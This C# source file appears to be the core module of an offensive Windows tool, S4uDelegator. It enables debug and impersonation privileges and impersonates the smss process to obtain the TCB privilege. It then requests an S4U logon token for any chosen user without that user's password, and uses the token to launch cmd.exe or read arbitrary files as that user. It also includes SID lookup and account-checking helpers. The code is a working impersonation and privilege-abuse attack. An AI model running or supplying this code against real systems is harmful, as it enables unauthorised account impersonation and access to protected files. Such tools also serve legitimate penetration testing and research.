using System;
using System.IO;
using System.Security.Principal;
using System.Text.RegularExpressions;
using S4uDelegator.Interop;

namespace S4uDelegator.Library
{
    class Modules
    {
        public static bool GetShell(
            string username,
            string sid)
        {
            string domain = null;

            Console.WriteLine();

            if (!VerifyAccount(
                ref domain,
                ref username,
                ref sid,
                out string upn))
            {
                return false;
            }

            if (!string.IsNullOrEmpty(upn))
            {
                Console.WriteLine("[-] Target account for this function should be local account.\n");

                return false;
            }

            Console.WriteLine("[>] Trying to get SYSTEM.");

            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
            var privs = new string[] {
                Win32Const.SE_DEBUG_NAME,
                Win32Const.SE_IMPERSONATE_NAME
            };

            if (!Utilities.EnableMultiplePrivileges(hCurrentToken, privs))
                return false;

            privs = new string[] {
                Win32Const.SE_TCB_NAME,
                Win32Const.SE_ASSIGNPRIMARYTOKEN_NAME
            };

            if (!Utilities.ImpersonateAsSmss(privs))
                return false;

            IntPtr hS4uToken = Utilities.GetMsvS4uLogonToken(
                username,
                domain,
                Win32Const.SECURITY_LOGON_TYPE.Batch);

            if (hS4uToken == IntPtr.Zero)
                return false;

            bool status = Utilities.CreateTokenAssignedProcess(
                hS4uToken,
                "C:\\Windows\\System32\\cmd.exe");

            Win32Api.CloseHandle(hS4uToken);

            return status;
        }


        public static bool S4uReadFile(
            string domain,
            string username,
            string sid,
            string path)
        {
            string fullPath = Path.GetFullPath(path);

            Console.WriteLine();
            Console.WriteLine("[>] Trying to read file with S4U logon.");
            Console.WriteLine("    |-> Target Path : {0}", fullPath);

            if (!File.Exists(fullPath))
            {
                Console.WriteLine("[-] Target file does not exist.\n");

                return false;
            }

            if (!VerifyAccount(
                ref domain,
                ref username,
                ref sid,
                out string upn))
            {
                return false;
            }

            Console.WriteLine("[>] Trying to get SYSTEM.");

            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
            var privs = new string[] {
                Win32Const.SE_DEBUG_NAME,
                Win32Const.SE_IMPERSONATE_NAME
            };

            if (!Utilities.EnableMultiplePrivileges(hCurrentToken, privs))
                return false;

            privs = new string[] {
                Win32Const.SE_TCB_NAME,
                Win32Const.SE_IMPERSONATE_NAME
            };

            if (!Utilities.ImpersonateAsSmss(privs))
                return false;

            IntPtr hS4uToken;

            if (string.IsNullOrEmpty(upn))
            {
                hS4uToken = Utilities.GetMsvS4uLogonToken(
                    username,
                    domain,
                    Win32Const.SECURITY_LOGON_TYPE.Network);
            }
            else
            {
                hS4uToken = Utilities.GetKerbS4uLogonToken(
                    username,
                    domain,
                    Win32Const.SECURITY_LOGON_TYPE.Network);
            }

            if (hS4uToken == IntPtr.Zero)
                return false;

            bool status = Utilities.ImpersonateThreadToken(hS4uToken);

            Win32Api.CloseHandle(hS4uToken);

            if (!status)
                return false;

            string content = File.ReadAllText(fullPath);
            Console.WriteLine("\n[{0}]", fullPath);
            Console.WriteLine(content);
            Console.WriteLine();

            return status;
        }


        public static bool LookupSid(
            string domain,
            string username,
            string sid)
        {
            string result;
            string accountName;

            if ((!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(username)) &&
                !string.IsNullOrEmpty(sid))
            {
                Console.WriteLine("\n[!] Username or domain name should not be specified with SID at a time.\n");

                return false;
            }
            else if (!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(username))
            {
                if (!string.IsNullOrEmpty(domain) && domain.Trim() == ".")
                    domain = Environment.MachineName;

                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
                    accountName = string.Format("{0}\\{1}", domain, username);
                else if (!string.IsNullOrEmpty(domain))
                    accountName = domain;
                else if (!string.IsNullOrEmpty(username))
                    accountName = username;
                else
                    return false;

                result = Helpers.ConvertAccountNameToSidString(
                    ref accountName,
                    out Win32Const.SID_NAME_USE peUse);

                if (!string.IsNullOrEmpty(result))
                {
                    Console.WriteLine();
                    Console.WriteLine("[*] Result:");
                    Console.WriteLine("    |-> Account Name : {0}", accountName);
                    Console.WriteLine("    |-> SID          : {0}", result);
                    Console.WriteLine("    |-> Account Type : {0}", peUse.ToString());
                    Console.WriteLine();

                    return true;
                }
                else
                {
                    Console.WriteLine("\n[*] No result.\n");

                    return false;
                }
            }
            else if (!string.IsNullOrEmpty(sid))
            {
                result = Helpers.ConvertSidStringToAccountName(
                    ref sid,
                    out Win32Const.SID_NAME_USE peUse);

                if (!string.IsNullOrEmpty(result))
                {
                    Console.WriteLine();
                    Console.WriteLine("[*] Result:");
                    Console.WriteLine("    |-> Account Name : {0}", result);
                    Console.WriteLine("    |-> SID          : {0}", sid);
                    Console.WriteLine("    |-> Account Type : {0}", peUse.ToString());
                    Console.WriteLine();

                    return true;
                }
                else
                {
                    Console.WriteLine("\n[*] No result.\n");

                    return false;
                }
            }
            else
            {
                Console.WriteLine("\n[!] SID, domain name or username to lookup is required.\n");

                return false;
            }
        }


        private static bool VerifyAccount(
            ref string domain,
            ref string username,
            ref string sid,
            out string upn)
        {
            string computerName = Environment.MachineName;
            string currentDomain = Helpers.GetCurrentDomain();
            string fqdn = currentDomain;
            string localSid = Helpers.ConvertAccountNameToSidString(
                ref computerName,
                out Win32Const.SID_NAME_USE peUse);
            string domainSid;
            string accountName;
            string accountSid;
            string patternDomainSid;
            string patternLocalSid = string.Format("^{0}(-\\d+)$", localSid);
            var rgx = new Regex(patternLocalSid);
            upn = null;

            if (domain == ".")
                domain = Environment.MachineName;

            if (string.IsNullOrEmpty(currentDomain))
            {
                domainSid = null;
                patternDomainSid = null;
            }
            else
            {
                domainSid = Helpers.ConvertAccountNameToSidString(
                    ref currentDomain,
                    out peUse);
                patternDomainSid = string.Format("^{0}(-\\d+)$", domainSid);
            }

            if ((!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(username)) &&
                !string.IsNullOrEmpty(sid))
            {
                Console.WriteLine("[!] Account name and SID should not be specified at a time.\n");

                return false;
            }

            if (string.IsNullOrEmpty(sid))
            {
                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
                    accountName = string.Format("{0}\\{1}", domain, username);
                else if (!string.IsNullOrEmpty(domain))
                    accountName = domain;
                else if (!string.IsNullOrEmpty(username))
                    accountName = username;
                else
                    return false;

                accountSid = Helpers.ConvertAccountNameToSidString(
                    ref accountName,
                    out peUse);
            }
            else
            {
                accountSid = sid;
                accountName = Helpers.ConvertSidStringToAccountName(
                    ref accountSid,
                    out peUse);
            }

            if (!string.IsNullOrEmpty(accountName) &&
                !string.IsNullOrEmpty(accountSid))
            {
                if (peUse != Win32Const.SID_NAME_USE.SidTypeUser)
                {
                    Console.WriteLine("[-] Target account should be user account.\n");

                    return false;
                }

                try
                {
                    domain = accountName.Split('\\')[0];
                    username = accountName.Split('\\')[1];
                }
                catch
                {
                    Console.WriteLine("[-] Failed to parse account name.\n");

                    return false;
                }

                Console.WriteLine("[>] Target account to S4U:");
                Console.WriteLine("    |-> Account Name        : {0}", accountName);
                Console.WriteLine("    |-> Account Sid         : {0}", accountSid);
                Console.WriteLine("    |-> Account Type        : {0}", peUse.ToString());

                if (rgx.IsMatch(accountSid))
                {
                    upn = null;
                }
                else if (!string.IsNullOrEmpty(domainSid))
                {
                    rgx = new Regex(patternDomainSid);

                    if (rgx.IsMatch(accountSid))
                    {
                        upn = string.Format("{0}@{1}", username, fqdn);
                    }
                    else
                    {
                        Console.WriteLine("[-] Target account cannot be used to S4U.\n");

                        return false;
                    }
                }
                else
                {
                    Console.WriteLine("[-] Target account cannot be used to S4U.\n");

                    return false;
                }

                Console.WriteLine("    |-> User Principal Name : {0}", string.IsNullOrEmpty(upn) ? "(NULL)" : upn);

                return true;
            }
            else
            {
                Console.WriteLine("[-] Failed to resolve target account information.\n");

                return false;
            }
        }
    }
}
